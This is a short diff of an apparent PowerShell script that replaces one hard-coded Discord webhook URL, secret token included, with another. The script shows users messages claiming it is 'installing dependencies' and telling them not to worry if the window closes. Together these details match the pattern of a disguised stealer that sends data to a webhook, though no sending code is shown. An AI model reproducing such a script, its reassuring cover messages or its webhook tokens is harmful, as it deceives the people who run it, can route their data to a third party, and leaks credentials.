@@ -1,4 +1,4 @@
-$webhookUrl = 'https://discord.com/api/webhooks/1411023027860410490/tX-RGpPD7WxrwbTmOcDaU8BZG-2-FDfJsvMi9DXF2Dc57h1WJQMVReBZ-RF2AnmPV095'
+$webhookUrl = 'https://discord.com/api/webhooks/1411831853316309032/Aa7_D6ww5IFImc16J8FasyThHIiNz07KRCT1K3fmwQYZC1SwaL35u0RHKMbQuaZKcYYy'
 
 Write-Host "Give us 1-3 minutes depending on your PC. We are installing dependencies."
 Write-Host "Don't worry if the window closes, just wait."
